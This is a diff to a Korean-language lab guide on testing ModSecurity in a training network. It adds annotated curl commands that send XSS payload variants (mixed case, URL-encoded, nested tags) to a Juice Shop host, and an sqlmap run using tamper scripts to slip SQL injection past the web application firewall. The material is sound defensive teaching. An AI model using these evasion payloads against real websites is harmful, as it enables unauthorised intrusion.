@@ -114,23 +114,61 @@ GET /%61dmin
 
 ### 1 — paranoia 1 우회 시도
 
-```
+```bash
+# XSS payload 4 변형의 ModSec 차단 비교
+#   각 변형이 paranoia 1 룰을 어떻게 회피 (또는 못 회피) 하는가
 ssh 6v6-attacker '
-# 원본 (차단 예상)
-curl -s -o /dev/null -w "원본: %{http_code}\n" -H "Host: juice.6v6.lab" "http://10.20.30.1/?q=<script>alert(1)</script>"
-# 변형 1: 대소문자
-curl -s -o /dev/null -w "case: %{http_code}\n" -H "Host: juice.6v6.lab" "http://10.20.30.1/?q=<ScRiPt>alert(1)</ScRiPt>"
-# 변형 2: encoding
-curl -s -o /dev/null -w "url-enc: %{http_code}\n" -H "Host: juice.6v6.lab" "http://10.20.30.1/?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E"
-# 변형 3: nested
-curl -s -o /dev/null -w "nested: %{http_code}\n" -H "Host: juice.6v6.lab" "http://10.20.30.1/?q=<sc<script>ript>alert(1)</script>"
+# 변형 0 (원본): <script>alert(1)</script>
+#   ModSec 941100 (libinjection-XSS) 가 강력 매치 → 403 예상
+curl -s -o /dev/null -w "원본:    %{http_code}\n" \
+    -H "Host: juice.6v6.lab" \
+    "http://10.20.30.1/?q=<script>alert(1)</script>"
+
+# 변형 1 (case): <ScRiPt> 대소문자 mixing
+#   CRS 룰이 nocase 적용 → 차단 여전 (403 예상)
+curl -s -o /dev/null -w "case:    %{http_code}\n" \
+    -H "Host: juice.6v6.lab" \
+    "http://10.20.30.1/?q=<ScRiPt>alert(1)</ScRiPt>"
+
+# 변형 2 (URL encoding): %3C%3E 로 < > 변환
+#   ModSec 의 URL decode 단계가 정상 동작 시 차단 (403)
+curl -s -o /dev/null -w "url-enc: %{http_code}\n" \
+    -H "Host: juice.6v6.lab" \
+    "http://10.20.30.1/?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E"
+
+# 변형 3 (nested tag): <sc<script>ript>
+#   브라우저는 처음 <script> 만 parse → 결과적 <script>ript>alert ...
+#   ModSec 의 libinjection 이 정교히 매치 (대부분 차단)
+curl -s -o /dev/null -w "nested:  %{http_code}\n" \
+    -H "Host: juice.6v6.lab" \
+    "http://10.20.30.1/?q=<sc<script>ript>alert(1)</script>"
 '
+# 예상 결과 (paranoia 1):
+#   원본:    403  (libinjection 매치)
+#   case:    403  (nocase modifier)
+#   url-enc: 403  (CRS URL decode 후 매치)
+#   nested:  403  (libinjection 정교 매치)
+# 일부 paranoia 1 우회 가능 → paranoia 2 권장 (W06 참조)
 ```
 
 ### 2 — sqlmap tamper
 
-```
-ssh 6v6-attacker 'timeout 30 sqlmap -u "http://10.20.30.1/?q=1" --batch --tamper=space2comment --headers="Host: dvwa.6v6.lab" 2>&1 | tail -10' || true
+```bash
+# sqlmap 의 tamper script — payload 자동 변형
+#   --tamper=space2comment: 공백 ' ' → /**/ (SQL comment, 공백 동등)
+#     예: '1 OR 1=1' → '1/**/OR/**/1=1'
+#   --batch: 모든 질문 자동 yes
+#   --headers: HAProxy vhost
+#   timeout 30: 30초 후 중단 (학습 환경 부하 방지)
+ssh 6v6-attacker 'timeout 30 sqlmap -u "http://10.20.30.1/?q=1" \
+    --batch \
+    --tamper=space2comment \
+    --headers="Host: dvwa.6v6.lab" 2>&1 | tail -10' || true
+# 결과 분석:
+#   "[INFO] testing..." 후 vulnerable 발견 → tamper 우회 성공
+#   "[CRITICAL] not injectable" → tamper 우회 실패 → paranoia 1 강력
+# 다양한 tamper:
+#   randomcase / charunicodeescape / between / equaltolike / apostrophenullencode
 ```
 
 ### 3 — ModSec 차단 카운트 비교
